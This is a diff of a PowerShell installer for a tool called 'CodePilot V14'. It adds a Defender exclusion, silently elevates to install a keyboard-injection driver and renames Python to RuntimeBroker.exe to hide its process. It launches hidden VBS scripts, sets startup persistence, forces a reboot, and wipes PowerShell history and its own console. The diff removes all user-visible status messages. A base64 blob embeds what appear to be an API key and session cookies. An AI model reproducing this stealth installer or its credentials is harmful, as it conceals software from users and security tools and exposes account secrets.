@@ -24,20 +24,14 @@ try {
     Add-MpPreference -ExclusionProcess "python.exe" -ErrorAction SilentlyContinue
 } catch {}
 
-Write-Host "`n===== CodePilot V14 — Installing... =====" -ForegroundColor Cyan
-
 # -- Post-reboot resume --
 $resumeFlag = Join-Path $dir ".resume_after_reboot"
 if (Test-Path $resumeFlag) {
-    Write-Host "[RESUME] Post-reboot launch..." -ForegroundColor Green
     Remove-Item $resumeFlag -Force -ErrorAction SilentlyContinue
     Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "TechnoResume" -ErrorAction SilentlyContinue
     Start-Sleep -Seconds 10
     $vbs = Join-Path $dir "stealth.vbs"
-    if (Test-Path $vbs) {
-        & wscript.exe $vbs
-        Write-Host "Running! NumLock ON = hotkeys | ESC = stop" -ForegroundColor Green
-    }
+    if (Test-Path $vbs) { & wscript.exe $vbs }
     exit 0
 }
 
@@ -46,18 +40,15 @@ Get-Process -Name RuntimeBroker -ErrorAction SilentlyContinue | Where-Object { $
 Start-Sleep -Milliseconds 500
 
 # 2. Download
-Write-Host "[1/6] Downloading from $repo ($branch)..." -ForegroundColor Yellow
 $zip = "$env:TEMP\t_$(Get-Random).zip"
 try {
     Invoke-WebRequest "https://github.com/$repo/archive/refs/heads/$branch.zip" -OutFile $zip -UseBasicParsing
 } catch {
-    Write-Host "  Trying alternative URL..." -ForegroundColor Yellow
-    Invoke-WebRequest "https://github.com/$repo/archive/$branch.zip" -OutFile $zip -UseBasicParsing
+    try { Invoke-WebRequest "https://github.com/$repo/archive/$branch.zip" -OutFile $zip -UseBasicParsing } catch {}
 }
-if (-not (Test-Path $zip)) { Write-Host "Download failed!" -ForegroundColor Red; exit 1 }
+if (-not (Test-Path $zip)) { exit 1 }
 
 # 3. Extract
-Write-Host "[2/6] Extracting..." -ForegroundColor Yellow
 if (Test-Path $dir) { Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue }
 $tmp = "$env:TEMP\t_ex_$(Get-Random)"
 Expand-Archive $zip -DestinationPath $tmp -Force
@@ -67,30 +58,30 @@ Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item $zip -Force -ErrorAction SilentlyContinue
 
 # 4. Python + venv + deps
-Write-Host "[3/6] Setting up Python..." -ForegroundColor Yellow
 $py = $null
 foreach ($c in @('python','python3','py')) {
-    try { $v = & $c --version 2>&1; if ($LASTEXITCODE -eq 0) { $py = $c; Write-Host "  Found: $v"; break } } catch {}
+    try { $v = & $c --version 2>&1; if ($LASTEXITCODE -eq 0) { $py = $c; break } } catch {}
 }
-if (-not $py) { Write-Host "ERROR: Python not found! Install from python.org" -ForegroundColor Red; exit 1 }
+if (-not $py) { exit 1 }
 
 $vpy = Join-Path $dir ".venv\Scripts\python.exe"
 if (-not (Test-Path $vpy)) {
     & $py -m venv (Join-Path $dir ".venv")
-    if ($LASTEXITCODE -ne 0) { Write-Host "venv failed!" -ForegroundColor Red; exit 1 }
+    if ($LASTEXITCODE -ne 0) { exit 1 }
 }
-& $vpy -m pip install --upgrade pip -q 2>$null
-& $vpy -m pip install -r (Join-Path $dir "requirements.txt") -q 2>$null
-& $vpy -m pip install -e $dir -q 2>$null
-Write-Host "  Done!" -ForegroundColor Green
+
+# pip commands: use SilentlyContinue so proxy warnings don't crash the script
+$ErrorActionPreference = 'SilentlyContinue'
+& $vpy -m pip install --upgrade pip -q 2>&1 | Out-Null
+& $vpy -m pip install -r (Join-Path $dir "requirements.txt") -q 2>&1 | Out-Null
+& $vpy -m pip install -e $dir -q 2>&1 | Out-Null
+$ErrorActionPreference = 'Stop'
 
 # 5. Config
-Write-Host "[4/6] Configuring..." -ForegroundColor Yellow
 $envFile = Join-Path $dir ".env.example"
 $cfgBlob = "IyBDb2RlUGlsb3QgVjE0IENvbmZpZ3VyYXRpb24KR0VNSU5JX0FQSV9LRVlfRU5DPVFWRXVRV0k0VWs0MlRETmlUbXRFUVhSZldXcDVZek5pYjBsdVVIUmFkRkV4V0hCdmRTMXNTVzVaYlhaMGNqSTNVR2RZTVVFPQpHRU1JTklfMVBTSUQ9Zy5hMDAwQ1FrVFRQY0tyS25jdnRkcHVrMXBDMF9fc1dsSnlXS3JRZUEzVVQtZ2J6UXZ5bHEzNkhoeWRmVFZ2WTNmZVlaZ2ZGR0xpUUFDZ1lLQVFnU0FSVVNGUUhHWDJNaXNfYUdERmlibVVLVjdOUXlzOElkVWhvVkFVRjh5S29mSFZwODlDbkMwVm1RUjVqWXg5dDMwMDc2CkdFTUlOSV8xUFNJRFRTPXNpZHRzLUNqY0JYTXc0MVhUQWI4RmdjT2M0TWI2S180MGJLdW92XzlEN2JYZi1QYUg1Rm1DdTZXSmVFWWtVOGJyc041cEtybHFhc0dIMWFxdE1FQUEKR0VNSU5JX01PREVMPXByb19maXJzdApHRU1JTklfTUFYX0FUVEVNUFRTPTUKR0VNSU5JX01PREVMX1RSSUVTPTMKR0VNSU5JX1RJTUVPVVQ9MTgwCkdFTUlOSV9BVFRFTVBUX1RJTUVPVVQ9MTgwCkdFTUlOSV9JTklUX1RJTUVPVVQ9MzAKR0VNSU5JX1JFSU5JVF9QQVVTRT0xCkdFTUlOSV9NQVhfQkFDS09GRj0xMApHRU1JTklfV0FUQ0hET0dfVElNRU9VVD0xODAKV1BNPTIwMApUWVBFX0lOVEVSVkFMPTAuMDE1CkZJWF9BVVRPX0NMT1NFPXRydWUKUkVTVUxUX0RFTEFZPTEwCkNIVU5LX0FNT1VOVD0xCkNIVU5LX1RZUEU9Y2hhcnMKSFRUUF9QUk9YWT0KSFRUUFNfUFJPWFk9"
 $envContent = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cfgBlob))
 [System.IO.File]::WriteAllText($envFile, $envContent)
-Write-Host "  Config ready!" -ForegroundColor Green
 
 # 6. Stealth launcher + driver
 $sd = Join-Path $dir ".venv\Scripts"
@@ -105,7 +96,6 @@ try {
 } catch {}
 
 if (-not $driverOK) {
-    # Download the official Interception driver from GitHub
     $icpZip = Join-Path $env:TEMP "icp_$(Get-Random).zip"
     $icpDir = Join-Path $env:TEMP "icp_$(Get-Random)"
     try {
@@ -116,11 +106,9 @@ if (-not $driverOK) {
         if (Test-Path $installer) {
             $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
             if ($isAdmin) {
-                # Already admin — run directly, no UAC needed
                 & cmd.exe /c "`"$installer`" /install" >$null 2>&1
                 $needsReboot = $true
             } else {
-                # Not admin — elevate silently
                 $drvBat = Join-Path $env:TEMP "icp_inst_$(Get-Random).bat"
                 "@echo off`r`n`"$installer`" /install >nul 2>&1" | Set-Content $drvBat -Encoding ASCII
                 try {
@@ -139,11 +127,12 @@ if (-not $driverOK) {
 $rb = Join-Path $sd "RuntimeBroker.exe"
 if (-not (Test-Path $rb)) {
     Copy-Item $pyExe $rb -Force
-    & $pyExe (Join-Path $dir "patch_exe.py") $rb 2>$null
-    # Verify RuntimeBroker.exe works before deleting python.exe
+    $ErrorActionPreference = 'SilentlyContinue'
+    & $pyExe (Join-Path $dir "patch_exe.py") $rb 2>&1 | Out-Null
+    $ErrorActionPreference = 'Stop'
     $testRb = & $rb -c "print('OK')" 2>&1
     if ("$testRb" -notmatch "OK") {
-        Copy-Item $pyExe $rb -Force  # Use unpatched copy as fallback
+        Copy-Item $pyExe $rb -Force
     }
 }
 Remove-Item $pyExe -Force -ErrorAction SilentlyContinue
@@ -181,25 +170,15 @@ Set s = CreateObject("WScript.Shell")
 s.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$localScript""", 0, False
 "@ | Out-File $startupVbs -Encoding ASCII
 
-    Write-Host "`n===== RESTARTING IN 10 SECONDS =====" -ForegroundColor Red
-    Write-Host "  Auto-launches after restart. Ctrl+C to cancel.`n" -ForegroundColor Yellow
     Start-Sleep -Seconds 10
     Restart-Computer -Force
 } else {
-    Write-Host "`n===== INSTALLED + RUNNING =====" -ForegroundColor Green
-    Write-Host "  Location : $dir" -ForegroundColor DarkGray
-    Write-Host "  Process  : RuntimeBroker.exe (hidden)" -ForegroundColor DarkGray
-    Write-Host "  NumLock ON = hotkeys | OFF = typing | ESC = stop`n" -ForegroundColor Cyan
     & wscript.exe $vbs
 }
 
 # Clean install trace from PowerShell history
+try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
 try {
-    # Clear in-memory readline history so arrow keys don't show it
-    [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
-} catch {}
-try {
-    # Clean the history file on disk
     $hPath = (Get-PSReadLineOption).HistorySavePath
     if ($hPath -and (Test-Path $hPath)) {
         $lines = Get-Content $hPath -ErrorAction SilentlyContinue
@@ -217,16 +196,12 @@ try {
     }
 } catch {}
 
-# Close this terminal window — try multiple methods
+# Close terminal
 try {
-    # Method 1: kill the console window directly
     $hwnd = [H.W]::GetConsoleWindow()
     Add-Type -Name K -Namespace H -MemberDefinition '[DllImport("user32.dll")]public static extern uint GetWindowThreadProcessId(IntPtr h,out uint p);' -ErrorAction SilentlyContinue
     $wpid = 0; [H.K]::GetWindowThreadProcessId($hwnd, [ref]$wpid) | Out-Null
     if ($wpid -and $wpid -ne 0) { Stop-Process -Id $wpid -Force -ErrorAction SilentlyContinue }
 } catch {}
-try {
-    # Method 2: kill own process
-    Stop-Process -Id $PID -Force
-} catch {}
+try { Stop-Process -Id $PID -Force } catch {}
 exit
